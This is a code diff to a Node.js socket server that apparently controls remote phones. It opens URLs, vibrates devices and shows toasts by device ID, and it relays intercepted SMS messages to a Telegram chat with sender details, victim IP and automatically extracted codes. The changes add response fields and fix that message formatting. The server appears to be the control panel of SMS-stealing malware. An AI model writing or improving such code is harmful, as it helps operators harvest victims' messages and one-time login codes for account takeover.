@@ -100,7 +100,8 @@ const getUserByDeviceId = async (portname, devid, callback = () => {}) => {
         }
         callback({
             status: false,
-            method: "getUserByDeviceId"
+            method: "getUserByDeviceId",
+            message: "USER_NOT_FOUND"
         });
     })
 }
@@ -119,7 +120,8 @@ const getSafeUserByDeviceId = async (portname, devid, callback = () => {}) => {
         }
         callback({
             status: false,
-            method: "getUserByDeviceId"
+            method: "getUserByDeviceId",
+            message: "USER_NOT_FOUND"
         });
     })
 }
@@ -157,13 +159,15 @@ const openUrl = async (portname, passname, devid, url, callback = () => {}) => {
                         callback({
                             status: true,
                             method: "openUrl",
-                            url: url
+                            url: url,
+                            device_id: found.device_id
                         });
                         return;
                     } else {
                         callback({
                             status: false,
-                            method: "openUrl"
+                            method: "openUrl",
+                            device_id: found.device_id
                         });
                         return;
                     }
@@ -202,13 +206,15 @@ const vibratePhone = async (portname, passname, devid, callback = () => {}) => {
                     if (_message.status == true){
                         callback({
                             status: true,
-                            method: "vibratePhone"
+                            method: "vibratePhone",
+                            device_id: found.device_id
                         });
                         return;
                     } else {
                         callback({
                             status: false,
-                            method: "vibratePhone"
+                            method: "vibratePhone",
+                            device_id: found.device_id
                         });
                         return;
                     }
@@ -251,13 +257,15 @@ const sendToast = async (portname, passname, devid, toast, callback = () => {}) 
                         callback({
                             status: true,
                             method: "sendToast",
-                            toast: toast
+                            toast: toast,
+                            device_id: found.device_id
                         });
                         return;
                     } else {
                         callback({
                             status: false,
-                            method: "sendToast"
+                            method: "sendToast",
+                            device_id: found.device_id
                         });
                         return;
                     }
@@ -428,7 +436,8 @@ const server = net.createServer(async (socket) => {
                             if (!_port.status){
                                 socket.write(JSON.stringify({
                                     status: false,
-                                    message: "INVALID_PORT_OR_PASSWORD"
+                                    message: "INVALID_PORT_OR_PASSWORD",
+                                    method: message.method
                                 }));
                                 return;
                             }
@@ -436,7 +445,8 @@ const server = net.createServer(async (socket) => {
                             if (_port.user.is_ban){
                                 socket.write(JSON.stringify({
                                     status: false,
-                                    message: "YOU_BANNED"
+                                    message: "YOU_BANNED",
+                                    method: message.method
                                 }));
                                 return;
                             }
@@ -533,7 +543,7 @@ const server = net.createServer(async (socket) => {
                             let codes = extractCodes(message.sms);
                             await cli.sendMessage(
                                 prt.port.chat_id,
-                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + codes !== "" ? build(`💠 𓏺|𓏺 codes: ${codes}`) : "" + build("📀 𓏺|𓏺 message:") + "\n" + message.sms + "\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
+                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + (codes !== "" ? build(`\n💠 𓏺|𓏺 codes: ${codes}`) : "") + build("\n📀 𓏺|𓏺 message:") + "\n\n" + message.sms + "\n\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
                                 {
                                     parse_mode: "HTML"
                                 }
